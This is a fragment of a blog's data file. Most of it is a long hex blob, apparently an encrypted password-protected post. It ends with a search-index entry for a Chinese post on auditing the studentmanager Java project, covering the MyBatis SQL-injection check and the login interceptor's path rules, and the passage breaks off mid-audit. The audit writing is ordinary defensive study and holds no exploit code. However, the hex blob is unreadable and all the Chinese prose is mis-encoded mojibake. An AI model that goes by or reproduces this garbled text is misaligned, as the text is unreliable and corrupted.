ef12878f85d6ec9da4b2b0d79143736aff00bf07cee4d80aaad2cbd0d7985c9c87bf14d85dbdab69a4cd43e0a4d0cb9e0fc0ef96c825c78d7c20b2786eeacd28d5fced0bcda47f9f7cd17178fb248475ceac4bc4e65c9c7f1ef91298aa8844020f36e7ad495b72d6b5e6372be958144be2d14bbed4dbd70ebcb90e0e79d0a1512d0d921a827fc86eda2e8a32724b5e4974075be9e27e922978088869014fec39320a2de2f4bd7d66d0425150abe909b4b6e3aa5dada96e108fff819d7342ff455024c0ea31c6749a7ab91724162ac17938403450e2814ad1745ef7afe71259f130387d017dae705f50e3f21a8d9242106fd794e9a2587eb7da08316605c2ce9c560fe0c626a93d2a5f8197292b275a4dca751a3e806cb4638a2a845d2ec559b99e3fdbf6c0d98127c1be48149f3ba49495e6e98e6a0f75c7489b29afe7a916571d8c7d5714b277342451100d18f933581cf1cd9fbfd663033f9c032ea89bb9d0ae2aaa0f074b2a05090d691db4d6e70f34d77dd24eccfbe7deeda4c0fa6ba49010d7dda5395c22ab1f287977e6797f8439f77205a715055c48bb03156061a2b6147c43cb56ccb142104c9ef8ff066650839146cd3a55af2ade85de4b734faceda6c8f117bcf0b23cb1a6e6e0ee6b84a08cfee85648c4a75202c1a5a1705808df1e2728291ffe197954444f8ebf7c6d35a78ab442ea6bcd7266ceb7f5ec1a372373f0f21d94b58cd46c3215e660f460de020c066b7bdb62cc6595e1d965c67b07ccf0f26c03dc692d229f586726ab23ca279db38d35e19fb81cf82c493af5cc823f22d13545e58cfbe002e3c7ed2bd45c5a0599497b258de683ef63907ee30e415d7c2bff32a4225eee29edca03720a7e6cb73734ddf8d168c8c7935feca446e823692a1aaa5db909de6195e07ae64cde39b45c4f07d23a8de92d2217399a55b494eec0e85cd3bf866b40a9f13a047024598f25927bccfadbe991944f82b10de5662b7bb414c0bb98edd656cf333d7418228e860ffdfe21cdcfb81a2cd92b69d5701b5d7af2d8f41e5883ca667f7b9f186cf2ee4c8e215d8240e40e451de09531539d0c437df96e8337bf5db58298a6c3cb59eefdf0785fb424e015a2a05e7db180b00078b8e1b5a951bc68ad5ad99eb776590f5e3a4fb729ef2eeb8534f861d819bb98e820369d60411f51111a56f066863f63202e6743229b6efc29accdc19b40b565d7ca6d123ea039a908901281bac321a56c6428075c0ec228038dae8af53de400391d1a96b16a3832debd25ddfddb2ca351861931ac40c13246731a0ade989b42adbeb8c8d3af44f644ab968ab47044760334211795ed969a145435ea32fa6048faa8fb56c0fa43b82c37d169d93548c772517b8c069761cdecd0e6be16855cdaf3dadcf1bd71b340f6d277b394b391d4313f99e485602689f0ba9189fc5bd740b2f6413737740124312cac16cb56e0202da4aa870bfdf38e96cf33867960dd558b9c594908717a89157d3b3462cb61d792d76134f10ba6a517a78b8b544372bec98aaf900c4e3b2133bf8345efef2daf9882cb909e0901e4dc96aa0a4a5bfa39d2ef9d0a36a22bb7e5cd6e8c031580fc567f3d3e44c5a531b2439f5f532421e0e46d3597670a6ecf9f4886029fcbbf5cb92e27a2b8df5ad63ce40a09453eb860dfdcf1ed02cf9ba3097a36f42f82ba0406e642680983fabf56336888658492a3b8629ac5472efcd13a03e53e6186c44d25a67a9c10e92f19ce7644e43a6ceb7ca12e010da128ac83e581b29b320929268484b1b015cc28eebd6486f1f4d0b9877277ffe5dfa87f10179148dddbd47668a39ac270949e848de18d46cf8a18570449b4407e5bac0dfd4a89c3fb1481e5962a536bfad3650f18912c381915bfea35bedf53f7c47aae2cdd9a05dc2fa564be958314ae8230a6b0b91dad21faac72ef1962df947e6747856242836ca0eddbf438c5ca5b12a2bf520ea075723000126c91e4775a7c0a92d8b95661161db31eaf20017055387dbfbbdfb1e3ce4f5b02137d52d58e9aaca2ea9d07dfae0a21d4e92b22c807b393fb382a92f3d595272e705a3ca7341b6a5b2df6fbb7db5ee40ec9403d7d024916671868f90705cb11ba6e47de5a33a67f699c3288bd8253aedadb429c86064753a1cd9c0b3b999a5251925ba0a39480f4599dc8eeae93149ebea90dd01c1d6b32e2fca0f0f29367a0539eb5df50e07ae5687f3b1aa7302bdc89567546398ca981ba48fa100513dbf396224832956ebd0ab7c3b30486779cf36808e601baa90cc770a411386dc7eaebbf5f65b45ef1a5d6d78fbfb100fb8e6ad8ddbc80148578dd1ca80a3afe57f21027922674c37e2d3dd2a9c7e8c1841d90e2f7cbaac6788c761e1c4ef355933e4a29b6070a08743c25f97b9c496acba9ad21f06a255ad5e4a1f974de89b833ef64af39eb6b2754e02e51ac1295b573ab12798af187754831550908cbb67402c427522ef3fa4dd1e79d42019b178d0faa9e72b69be6dc253402335fa6d84a6213d557a4f25e3dfb5356a039c0f337fddf420f0e9895bce71b230aa264f3697cde84c160c75c7146c80e1b76a36eafaeae830bad64ecc38949d600d6db0474826609007e616915a89d843deb760a8852c0522749ab3e89da3340bf42cb5ce176585b6ae7861bb1554f0ad0acb231acb92633ed386da485d0b983bb31c7c4b5171717d0baf9cf3150957d0bdad6c380d24e5c4e28c39e68a361a470254f4bfd1f93fe31cdaaf36146d561e5fec328d683c4c90aeb91546e8d31a51319477d454166737b41660978d464805d4ead20ebe9e1433e554ade5704a7c56488d0b6e1b37872c7647296e69046d4c2c1213d50b5ab7a428526f742f98a37af4a36ef518295ec9832d1e369d8e9ec5b3ab7feceba1c1eae05a52f1d4d6084805f5c654edcd72b503ee560caef2226482e23a00466b814164ba27e20351051032eeec30deb57709fe247f7c32005f126599a8015fbc191b1eada2b9c7f6d242155fa867501fc1b7d4222e107cd796e9d500e7d6851d5e303a687701324200a2e1429a0a02b70ceaa74670277c495f523d391b0ee5ea48f9ae91266093199eaeec75f35fb28e031e577b25b3536e51015511ea6cb1d179eeb136b6e4106764f248df9854f5266eeb9298c9b8eae5fb249063406be4c052aa0aeb3a6d33a534f6aa734e9240e7bd0314ac876ab26cfb9e068485186ba64467d27ee186f2bc5d547d6fc7d4e17bcf4d123fdc2cb079ce8cd8e1762d5c2d8b588476bfa18651839e9b723758e5051d281109d7a80fcdbe9d8bde5ed597e2b5ffcfa481affbdf4a023f7883df5dcbf8aceb70ba8d2f4c15786e11e3ad7fdd56431b7753cc35a72cf0017d6dadce354bc28c75cdfbec9e81114e44277c9ce6ba99627e5794a642610114a7ebf744575ee443d7f9782a638acd3839602a73f42299397f1b624c5da2ec3a30d8df501697530e876e4ffe8357ffe708f4d3693d04d3a14fe0c5534fb6c2389d845720b9d2f31fa77dc33a8163e21141cb7afedf23fea9e83411f92a1a25cacf4925d95922f7def4bf66c9c64ab0303ec23406b90741bd6fff4cc93d6fd73f7f18eca2d076ec64efe55bc5142919159012a7124b2197f8c983b5b761c788b9e07e8d62912f6c00ffacfa7fd61e0bfede9fdef81f50fe7509c15572c201a2a6277902f71da859ee4479727fdd347049d7a8e7d57a358bfd0187713595d61e007a506683f491709e9ed635e3bf63cdbd0469830896ddd091e1e2a3225b09e5d55219b1581caa1a2bf67ef7789ca83fe1ff2fa814f4645f9a990563d5428036eb69c53443321144f7986008f3c9bd1348ec4987424cce5b6d2dc7217c7b1a514c5b4e39197ac3b68565870a103b66f6e409c1226dbaf5a9f85f2ff9140c2b6a3fd1ba998965ea851f2bd8909fa5b1deae54702e448f2ccd033134bbbbb232d053a2133c78ef4a67320603ef2a41d82b7d3d77920cad50a823233918d50e8b9d28dd755c8aefa720df767d3c2592d8aa67825e46be1405f1730c5a77b942e13752ce7732072a47f938f0aacedaef69352d9159176a1a23c9c22ab4d9b90aa52efdd5e7015a0e9debe1c0ec908b722cede60a40713831e721e878781e1f1863cee960306e276c4e672035d1248074f281b534e083d3154dee0555a59a7a9cb6c285cc3f089fb13e5e3a27a811629c7fd53bb0bbd91cc15f6486e8eb9dadfbf56e8487a1f0e87d9e3bcf13471aebc67e36b3f3703f80d787ad0bcdd146f407ec6d626b961cd12270216f8610954201ee46b4387e578e183b15be30ffd1e66df60ae949fbbff85ad63e7495c4e5e26bfdd3c040e7d216094eb63e227854939676f9cb681d23342799fadd7b56ffef2c5e353d7591c873a953f0a5be6eb47b015de6b76de1ee414bdf94c09865cf518c3db2e4ec009d7c79842d11f8553ea34436562dff80585a02819e3a14c7bc11916489abdac7b4be6949e472d0ede617fbce12a6f224bd98a0f7bceb6521da40773f4f8b43ae38dd3639350e5e649f1fef9d917a6621f6b113c47414d8e24ac0e1c94b75e5fffcc7cea3a17de125cd0d4770f1a265661809b02c44ba05946643bb19916a4da6d8114966b9cdaaa3bf9602dbe1b86a3dab82fe31883b967d2f20faf10fb18eb13288a782d4a4d71a2101cf6411a4c82bcf0c39a612f094f2aa6b9cf74c4e9307ad8695961ad24ded6625c216a117c02eeba1009d53506b0d6fc858e145db022056b3816592f3a1b2fcdd12540dab3e02ced343749bbfc2436e10088769779c4a7fafeb1b5760d22a8e7d4d19c722f9c6f74b425bb2ebbe34355d31f05a1ba625fd87b658af67babed512357b4e428c3f662ef2de9f59b1baa6342c08ba5fd3840d35b962a38903e204cdea4cd4a0b2e4cc9d04eb465d55f03f1d64f17e05b9ba70be4eadebb7422f663868b39f1b362f3e207503091278e86d723d3a9bb631d4dc64f67b87a2a499b8996cd6e0ec5df9d26d5d5d77f37e85123e533163a21dc4868f7c5d3ea61e6496f7670478a9debfa4684b34c0117ef70721b13598d682d9437629f4afa4b86b22aa21bc49f1fb92350e56655db2ad04570a7533d76df8aa78b5f167c85d887742e3a753ba219d1587ba69baeb826710064ca2f5a3bfe3dd183b19c2f2d0369a9bca7ba5145f4d0f8cf8ac9f0dca2a0c9f7a8b629a99da49a17d5368d2970bfbb48d36351c3492257503de5174cbb5024626c3192f3f446181f808a9717dd49bcd173e380907aad0894c6f5dacaf848177dbaa17b8f04778d6d718b259fa5825320751cef0fc31b42e5cc6a70822cf30e0761aba54a9b16df5b5742a0e68223c4033c78c85e057ac65e8f4380d0e5c47cfe7a889c72cac40e8bc50427eb87bbe65b975fe3673acbc1805ceefef40a66a7b214d6070b601e2290eafb6e0504ff566d40d62adac4d379e2f25eb74a136fec23e229d2ddf4da7672ed74fe8df6e30b43c3ed87addaa33a44d17f5c5cc2f06f2b49f68484b57973b6071a7a7a676b0fd41f1ec9cdf9d205f02cdc5c18e771668b720aa67f933203770dd7966acecd8557f55f0992e9c1a19297f0f5b670e51307dc1002cec49d6637d9123a168e7ae3790c65cd3d35873ccd8e3da2aa7a331f503d2873ead53c23dd27127bc54f6335c232e9fe36fb4ff2c307318506b59e7ae4ce848084e6ddcb80c970e6c18865b9323875a0822de939d8d4559987fcb346e8b0a5081e4309920092ecd1d2f6edc784d6b767fc0cfad46132dadb23ac94bffbd1359b445d0f8652a83b4a0e5ac3bb38832027d80153b062ca4a659273a8f58eb808ac7e8a316e90482bbc176d9cbc553c546c095b27505e5cd50a76f736d236cae592ed89bee1f1b5432ad178d03981cbb4e130f0d2c9884e988e8c0ca5240611ccee99a0dcb855571c01131a4d18abbe5bff37ba6db51ca514bdb2421e6d8ad9484f2c15923403370194333c3473acc13fc28ff889c7dad688f446033f6a9668821750d2b0f449f6ce131b89b2cd739feadd6f92ce24af000a1a6b1f13db8cc1204a9202fc4b090b93b3d62246bdc3d6a322fdb8c82d8094354f6b07f524fa39e99d266c017aa67030bbc718257c3c619f6f1d971769b58616a8de17ba29c441a56211566008378b75db99fb686b8a6aa4849a0adc4153f1723dd67567dcb64aba967a1639634dc9fbbb62e596c14a9e8ade27597a1a98d0355cec2a45ac2c7908e7535484e631c3a13ece251068ffc1dcaf9f15b1f210922198c9da1b0aa3e197b476033627f4107ff113cbc00753952bb9d786b767d4cc2de2626b20d90f04e7b68781513b3cec75f401d2b15c923acfa1f7db9989798ef4e48cd8ee65b33220d5d01a0462efa33c74b7ec8da43a7da8c7ae09d10c6ff9e844c7e569e9a40aa052f705721d74e03e6c991b3e4c961a29c3305cb1a092743e5e021aaa774aabcda685c88b26932954c8445368db55c37dbc6f14d69c9d3c0d7c29bbfa9978c005629dc793d999ec66bee138cb8efb1b725b20740314931c0afe806e9aa723da2030e03992d2722b45554d7805f212739e6c9c3fe01fd18738930201ae9c5a04a65db0c52d21e099018e0ffc95540eb0224d805371828cebeebe3065511f4d35d8216704adc91f68efeab25533488960d222274b3ba709e6a3433e0b754d6f063d384c283929b9a59383549e7efbc79a39c317253dcf4f7ceb1da9d993cf64265af3afaf41a8aba228a8653bb496c59036260a7f47a86e0bebeae09b44e676e6057a56d2fcc7474de90c4ce9a73a8eb8f59a16c619c1754117b20ab34c0a256f385ee794318502e4cdb304ae6ba40f7eb76b662956c2cb2bdd810426b17ad25fcc7faca638b7d04ceab970a4b23aac50a777e59c09aec6eccbd62760ad886d62a9d0347cab493b33b0af7607c94473de7a61c0b634ff97ab591de097c005472d3161cf5a980e1f64c25be4dabce3f5f38475ded3f0f32ee88f09107a2f00136843db2f06e10adf98b501d39d60707242e6c43919409020ce129ffbc847a0f5c8fe16d724825d80c40b6a2c9226e6787defd0c84f153e5a8520ea8282a915e279f8eddad15e7f14998354eb03f4b406c2d285f05f5979b7e49dd910e0ea5772bb400c334b163a94a644a11765e5c8c034ecaa21aca55f0e1092a729db0f4f9ebd5f0f0a887911c92dca08d8a95e7cf882237f7186e0f82743c6bde8e8cbf4634e562c94489ab0d318ebb542a8af4189267c767e2ca1e78d861c8b8288cec4db44e93cc80b63d75dab8c456bf5089d76fc8956cfdd3a88bd1fed611a9f13077d460ff93627cbd5886a167525d058e805e4bd87dafa19d5c3c97795ec8d7201b78f0ebe1287737446537006735f7f10093e5b65b52057d7406065797f4017470e8347208124a669307fa7a4ac4ee935f84ab0ed609d6f8de210712c2425cddff05c52092e25fdad2ce15c23f5356cbc5303905c5831483ce5e6b4424b4fbd87269a83727bf002edd745957989de14827d7040463b0b3867bc0ce9d5d883afbecf6b424f3f286e980e2e1733d1ccf84c91872deb1393bdc4a79ce68c202e75cdd4665934d79fbf45840a31430abcb16ccb0d45c126aa7a2b394b7f67ff1104b87471c791d4947c79171e40891fa6bf7226399c0553dbee1e6cecba7a639c5012bcb3a2d7387a36847d1f5fa56e1a3ad97351661431ab1e633592f8ab80797923a7761df20447ffb75f41fecaca071c36c77ca7ed009c18450ece4b39f3aac06ed1e9e988d84b9d8e8a6d6c07a631f72c1ff760a4376ad5618f6dd3010d4e0e2431276ee6ac0174f6e78ae0da00561857a2220f97320e9e0adc6978b5f859f654037d0fdc75a09f0b053bf8052637b89cd47c99bea994a2f27de7c7b9446b3d5c2d7e58023a97337811d6b6d514bd0b41aa16eb29436e663da6b4f692ea179b3c72db795f86b1a51bffdeac0a904745ab3cdc85d20866e9d931185c617d2b1afa96c92af84a5db832fc21fa4d41e8a05074753489076b6f047c2ef8c84d4e58f5d13b71fae6b3aa334f716c483847a7f93c6da599e0714dbea91cf4075bf6e1a195a7c05994bf79d40984e324a2869cd3c6a2ce86a1abb5cee55eacb54f0a0fa6bbee7dc8e0264cf17366f1ab1a249b276517e23a2f860ff47960b778f20909128df9763a9c241cacda20d84e5852ed8cb639e0e2ad3e7269e8afc0c3e3a912fed9a2e94146620518cad6eebfde49fc55a39f778c5efd90d708753966f488285e03bdce567837ca913e63b02e2f7d3330abc335671ae7a08153e179bd761e3fd46985e7718e00d754eab33042c71146fb7e2cc0d36f271a2ae3e87419af2920a8872e76b8abd929a58cf508ae4a6372387a84517f5791e0f0bf3ad1721e1e4467584d27d814e075e1b10c846d145790d93b20d079ea19ca87189dc01aacd7fac42b0fa04240b56f79dde975076e78bf8adc1e5014a0762d459aea5745b5bf5b339f748bec54aa1a7e56e5130bf724f80133a3214a1febe84e30f1ac512b2ce8cc2f2ed0206a27e44e5ba2790fc1c44082105afdf7c90f8620af5ca14eb91c2e37eb3c4d6617a9e44577ec10e7143232e4687087f996f6048508748775ed9bbcdbed81fdf8563b08d807690a0cf77f5563e449d3ecc78e68351fee3ba145db06dbb79295fba78da5bfdbaf6b26503998608565fb975d20638b2e694f1e104bbd9375c95321910093a5453540144beb93b8f073a6ee69006c596b4eb6f1bdca3141fe4de6797e429bc2a5cf3afe136f3bab922595dd4072ee4d388500674881f9137e9ae502397d13088e7b985b09ae02f8c4c4ab018a7e1a9edf33114aaf7c7b70b081d8315cdac29c209ed59b476130bca149049efb7815166fe8e798c88519299a898f53547ce33f20bccc58a26fd6ab51a647eb2ebd34be2b159cd2021f2eae4e3bf45eec918c52cc847c95c001440a09d3fed0261a0ab2564203ecbc20fb939c453eb5574cabbd4582430198dd11de32639ddf1f8b032d289fa50685080ed4376c5095d2d750b503670e276b8052938a1d572708b7ab6546e0257a0f0ecb5a79474d508edd5ed09183052608f909d2f7352491b5065840e72b065c82ec06a167466f02e27f2f019c52e300ba84930c4945df8f913ba0a590bc04a938701bd27bce9abd96570ca6e00749484b21a293b81456214f3185df7515b208a6683ef26a148774eac757fb697efd11943f77024577462d7e85b1e78011ba50c696885c07991a570790b8e7c38d2c83cc97d33764d4e4547081279107b014618e4196533e3f63a19322d2a5c1173d52af820858bd30f4df90485faacf3848dff94165e37808568675e6ddb8c8051c4f415fbdb66f1bd548b1ce840264a085d9c85ed83105772fe1fd4eeb283dbccee08000031b0aeb02643759367ced35e6bc3ff12f46ef9a0b9ac2803917554dd29c155c697e8497f9549235d24dd7bfbd2283a10a1cc8c6f52b355e291f51c94b987fcec64159bf4ad932ffe47fafa81cea034bc7f46e2b81c6f38206086ddbe77310a330b557d1cdd395f50de152a9036a3f7adb196d3edb536a4383aa7aeb7594c804ba8bd2f286251aa5efaab7f8a408bbc4335cb32692959df79a524eda999d984ee3bb6773f028c3ad9a974a3ec69278701f4ee6c0d66edc696e35f4d59a75adf56b89efc53dbbe63a3c6961e76f2ddaf55936ad1f9f46b00bfcc1a4892ae411d7f0d510b55a787f18969108a240d5324809ba3ff8ffffa9032c04b0a5b8ad0f44bf24c7e395bbf77f1dfac0c2b29c5d1f3798a5eafb046999d79ca476d467d5ec01b0e97e73c8bf3bfd8b0c01dc02342b3df6cbf1185b0bb98fd006e868762db7dc3aa4c99d483b4bf4d45e88169e6ca4f6552695731e7a91abe40f98b137abd5daaa31ed6c99f2cc90610be934031b8bad026caedafa548a0cbba499517c16ee013c7efd0a22665260d0fef19941c8b7c765f41de61e0b4f89b9d1fb70aeaf88d2a093b8fddf5422fc1eb518c1b15ccdf0d80dd984d43afdbad242d5da442a62afe241b59bff777fe6ad785f694bfcee3c407794831ad58960673ef818ba9b36626eeaa27716fef35f7f6f6f1234bf3dd0057ccceffc910ed1db841c21ac6b8de4f5b9691e180c6b7bbb956cf8a04892e0ba9339a22944180c90e8429cc2854a8c8579a4b0d5b2389facff6e5f5015bdfba7c801ff3c25fa00f359422c684f544f1c9429a8a8581c44f180d6a83ae4ae5aba93cecdff3a395423e2a484a6313013c88ce3ae0709dbd1c1bfd8b1c199e88729afb8025407bc5d80ff77b235ad48371a3dab4974149e18762fbb536a3c531b4576be7b3d151368796a76c701636c518b9bc09825c3f661d33316dd304668cd98daa35fda20cffa96b3a3a20aa519b64258d94e6d3bae5500f35abf56d6ecc53fac73fce6cda767afce8518f846bfe7301309a88e1c6bd214f24681341cf18f4940bf71e82746e206dcbfcfd00dc5ef2872bc846ee202ce6d8c1c334b6b05b112eaeb5676c09cc0e73dc72aa198bd2e00d54a8f8e7b0ac56a2f5608d11bf6fb7d87b38d91bc54b9168405274f072989e9c857bfc6cff2aed36515a21e92e73284ef7309b983c9cbcfeaa2b74668d6c70514a913bdc32feb86955bc69b1e27e50f60c89799c26dafac2c01bf4046309372f1d0ec281807b7903f06f2812a31fab85c2483369b896619c1f518c1f1ea80d2cd789969f857a2b374a390ac9e46c148d35e0fc68bf1fb7fbef4a32f6e46be3d7e235b3b0cb58b2abaea99aaf28106721041e7252ef5e9a7102762cb04c1f6e8ca3c0bbce4b3efebb3fc41cdc207cfef52c41f71c17e0fd10362e0806b3ac7af22e29deabc3ef01afe6d9a7c99c1b64e6cd049455f2b89935f0a27d33a3216081b9a2d18e1fb4bf25aef52237e59c728ec9be52989c49b67d9e23a23f082cb2bdcedac38e16690a723bf0f44a57599a6570ff704b9fa2b5e8e4da2f67c495a6c3b47b7980498fab054be312c76b5e51550bc05b745b637aad64e1fd7972f51ca344164f71b70ccd56891be4576ef8c04aaeff7d94c293f2ec7f4126154859dd178279abc3237da92c8fd1afaaa610ab7da405b463934cd49a4c4b6d84ea9dec32e8e361074015ca496e5161b68a4a98519cfa46f5792a57e2bba0c1b1a3d62a33920663d3ca402d8827c658e8e7b5f6aa921a635a504f0531fb55d99262b7e812eb7fc45f5f3cce4eb9602feac0b1c1eb10e17e30568599855e6b48ad578533b55e6f4977e8fefac4193cac973acca6843436319d884928f5f4a0044f7da8385acc84f652c9e9d7188e64688842fc7e5d3cfcc5d1df80de56e3f29983abafa3c3c7b3b9143fd5e618b9b57d6adbb7df6bdf37363566dda7d4e249c320d8f2e6a4fad6ee462b4d5fce84edd87b304ba4ee4e2a4833d2f2b3f80d23fae1d16ebcfdfcc89db8c9e58ffb48dcb47a0d8feaa7e0cfc1a10774ef1091a150d6821fe40d3a04e15313ef7f286e0025ebfef267a76cb12cd1fccf791518454b3d4621429bb87098667c0b6134ff395d6df2d7b3e57bdcda3e8ea731fac8f68b205057bd5ad8e497dda4312931b5405a60d8f82f0c48a765a5a6df7c490fc5df6d2e0cd1482855d6cf93002d56e286a0f1d31af902663f9a172921d1db9f367b5a2092f43cc9dd26619d4c6fea47d3dd0b9aaf711da9076cb6796c508ae05354963b5856f164a77ea96562647576b67459ba95f9f51a0fccd91809bd55bb9efa79caa9206b9c6b30fd5883c6a7b11313dd253000f4453cf26823837423babc26528e86a675bb41cadcaeac4f5f56b36e5112147af9d607740667c67b7530c72fe06817beee6cb45033f37a79183dfa83424838f1f3e577adf2a584e00593572a627867a5f36a60d938f7edf769f71598175f27f4163096098258a7994e2b51432a3894f857a1cc70f9ac793a580e9d5bd63d88529d9f4a4080bf6dbdbd67f9a94cfcf41bcb393adfb33ae2b5864c539bcc443cdba321eb56bc051645209a917bd46f841fb6b3df3365d6d33038ca5a9a64087dfc21ef8d4e7d030d009ea5dbf3f4353b9465652c832a7a7469dffdbc3543272ff33a2c04b42071564aa1aaf6eb0c86c18b05cc1d91d99065960c3f887675159abe24ac2b633b6484c71e75a578c0ae44933d52716643a9149039eaeb54f96e7654e3d35269a3caa875cf4540ffb24b9ef9840697ccf67b92521d4ec3778a8d2c982ea6d90f2a6932a138c25c7ce4c8b91c98b6963324da4dcb1f8174f6e36d9848ba6a406787276545657cac23b6c52f0d93a79dd22f7024c680a5e43e3bc8b4318469d3d500900a99cd62468eb56f62e2ccb3d8411f4b96f4b0d025fcb66ae613966378b52c64c10eff6be506f6d8891731cde5a28c7247d05108fba901d98efa20cfb2ec2c034d73f7091a21b74c1dc1a5c5061b44fb21114d71716591eb7173217e032de1efa2b2d28448471bb157c102f04c65fae35b8560293e89c723fad3d1e4042b9dd46fd21cbd4430db8fdab148fefd6b72b1ac1d516d0fc2548aa6b440e69afd8bd84055e53a938b0b23e28f188f320c236cb127a28ae877a3cae421d16e61a33c53ccdee719901ec7d862abb86f556f183437a154d915cee79cf431eefca7d91fedc5419a397e2d1c7fb0592e0a122e438f9723e37c1f8048031813f4005199ba44f04ce1514327879bec255e110abf4b07dab1b25b5d64e9348e5e89f700dc4e80121c6580a559afdf6037a68b2bebba8666256106559c6396a1d4de66d4ca757cc754af8865d0bfb15eba68ae14c4c00bd2d4775af03b64eb6b918825db81f8aa2cfe8bbe09f73921fe755049b41d9c7965b9cccf40c6fc6f25082d2095bcb218a39100b0b6f25912aee28db5e4a46ff41c7b0c181e65507b9367be019e8b7b70cb59c50a7305cefa5e1fb8c0e46348aafa2b7f86a20efd71d9128f055aba7f9958c011285cdcb1a74565e761ce6c94ef5ae22573f0f63bf482daf16467cca50f30b722c5ea21415406ea5d73810d75701f82bce1529c6e6915f0a756ccd8fafbc9aa071ee5d6bfa0e7f89afdf3211a804d75318aca7dcf2f82da04fbfa45e126f4ab75d02bd2d1449499bee33ac10b0037173522f8de2706c7058e11e076ad7bd4e9ff33ad38d0b6543379ff4ef164ca9fa178becfb4dbc12e5c25af40eddd0f7ae16decee253a2e4a99 è¯·è¾“å…¥å¯†ç "},{"title":"ä»£ç å®¡è®¡-studentmanager","path":"/2025/06/19/ä»£ç å®¡è®¡-studentmanager/","content":"å‰è¨€è¿™æ¬¡æ˜¯ç¬”è€…ç¬¬ä¸€æ¬¡è‡ªå·±æœªå€Ÿé‰´ä»»ä½•æ–‡ç« å®¡ä¸€ä¸ªç‹¬ç«‹é¡¹ç›® è¿™æ¬¡æ‰€å®¡çš„é¡¹ç›®æ¯”è¾ƒè€ï¼Œä½†éå¸¸é€‚åˆåƒæˆ‘ä¸€æ ·çš„javaå®¡è®¡æ–°æ‰‹æ¥è¿›è¡Œå°è¯•ï¼Œä¸‹é¢æˆ‘ä¼šä»”ç»†å†™ä¸Šé„™äººè¿™æ¬¡çš„å®¡è®¡æ€è·¯å’Œæ–¹æ³• æœ¬æ¬¡æˆ‘ç”¨çš„æ˜¯åŠé»‘ç›’ï¼‹åŠç™½ç›’çš„å®¡è®¡æ–¹æ³• ç¯å¢ƒæ­å»ºé¡¹ç›®åœ°å€ï¼šhttps://github.com/ZeroWdd/studentmanager jdk 1.8 mysql 5.5 tomcat 7 æˆ‘æ˜¯ç”¨navicatæ¥æ­å»ºæ•°æ®åº“ï¼Œå­—ç¬¦é›†é€‰æ‹©çš„æ˜¯utf8ï¼Œæ’åºè§„åˆ™é€‰æ‹©çš„æ˜¯utf8_bin æ–°å»ºå®Œæ•°æ®åº“åå°†é¡¹ç›®ä¸­çš„sql.sqlæ–‡ä»¶å¯¼å…¥è¿›å» ç„¶ååœ¨application.ymlæ–‡ä»¶ä¸­å°†ç›¸å…³ä¿¡æ¯è¾“å…¥è¿›å» åšå®Œè¿™äº›ä¹‹åå°±å¯ä»¥é€šè¿‡StudentmanagerApplication.javaå¯åŠ¨é¡¹ç›®äº†ï¼Œé»˜è®¤ç«¯å£æ˜¯8080 å®¡è®¡sqlæ³¨å…¥ä¸€æ‹¿åˆ°è¿™ä¸ªé¡¹ç›®çš„æ—¶å€™ï¼Œç¬¬ä¸€ä»¶äº‹æƒ…å°±æ˜¯çœ‹pom.xmlæ–‡ä»¶ï¼Œçœ‹æœ‰å“ªäº›å¯ä»¥åˆ©ç”¨çš„ä¾èµ–ä»¥åŠç‰ˆæœ¬ï¼Œçœ‹ç”¨çš„æ•°æ®åº“æ˜¯å“ªä¸€ç§ è¿™é‡Œæ˜¯ç”¨mybatisï¼Œå› æ­¤æˆ‘ä»¬å°±å…ˆä»å®¡æ˜¯å¦å­˜åœ¨sqlæ¼æ´å¼€å§‹ è€Œmybatisçš„æœªåšé¢„å¤„ç†çš„è¯æ‰€ç”¨çš„å±é™©å­—ç¬¦ä¾¿æ˜¯$ï¼Œæ‰€ä»¥æˆ‘ä»¬å…¨å±€æœç´¢ä¸€ä¸‹ï¼Œè·Ÿsqlç›¸å…³çš„xmlæ–‡ä»¶ä¸­ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œç‚¹è¿›å»åå‘ç°æ¯ä¸€ä¸ªsqlè¯­å¥éƒ½è¿›è¡Œäº†é¢„å¤„ç†ï¼Œæ˜¯åˆ©ç”¨#è¿›è¡Œå¤„ç†çš„ æ‰€ä»¥æ ¹æœ¬ä¸å­˜åœ¨sqlæ¼æ´ã€‚ã€‚ã€‚ã€‚ å®¡æ‹¦æˆªå™¨è¿™æ¬¡æ˜¯ä¸€ä¸ªspringmvcé¡¹ç›®ï¼Œæ‰€ä»¥æˆ‘çš„ä¸‹ä¸€æ­¥å°±æ˜¯å®¡è®¡interceptorsæ–‡ä»¶å¤¹ä¸‹é¢çš„æ–‡ä»¶ï¼Œçœ‹æ˜¯å¦å­˜åœ¨ä¸€äº›å¯ä»¥è¶Šæƒï¼Œç»•è¿‡ç™»å½•çš„åœ°æ–¹ è¿™æ¬¡è¯¥æ–‡ä»¶å¤¹ä¸‹é¢åªæœ‰ä¸€ä¸ªæ–‡ä»¶LoginInterceptor.javaï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š public class LoginInterceptor implements HandlerInterceptor @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws IOException Admin user = (Admin)request.getSession().getAttribute(Const.ADMIN); Teacher teacher = (Teacher)request.getSession().getAttribute(Const.TEACHER); Student student = (Student)request.getSession().getAttribute(Const.STUDENT); if(!StringUtils.isEmpty(user) || !StringUtils.isEmpty(teacher) || !StringUtils.isEmpty(student)) return true; response.sendRedirect(request.getContextPath() + /system/login); return false; è¯¥å‡½æ•°çš„ä½œç”¨ä¸»è¦å°±æ˜¯è¿›è¡Œä¸€ä¸ªç™»å½•æ£€æµ‹ï¼Œçœ‹sessionä¸­æ˜¯å¦å·²ç»æœ‰ç›¸å…³æ•°æ®ï¼Œæ²¡æœ‰çš„è¯å°±å¼ºåˆ¶è¿”å›ç™»å½•ç•Œé¢ æŸ¥çœ‹è¯¥æ–‡ä»¶åœ¨å“ªé‡Œç”¨ä¸Š-SpringmvcConfig.java public void addInterceptors(InterceptorRegistry registry) registry.addInterceptor(new LoginInterceptor()).addPathPatterns(/**).excludePathPatterns(/,/system/login,/system/checkCode,/easyui/**,/h-ui/**,/upload/**); è¯¥å‡½æ•°çš„ä¸»è¦ä½œç”¨å°±æ˜¯æ‹¦æˆªé™¤äº†å¯¹excludePathPatternså†…çš„è·¯å¾„å¤–çš„æ‰€æœ‰è¯·æ±‚è¿›è¡Œæ£€éªŒ 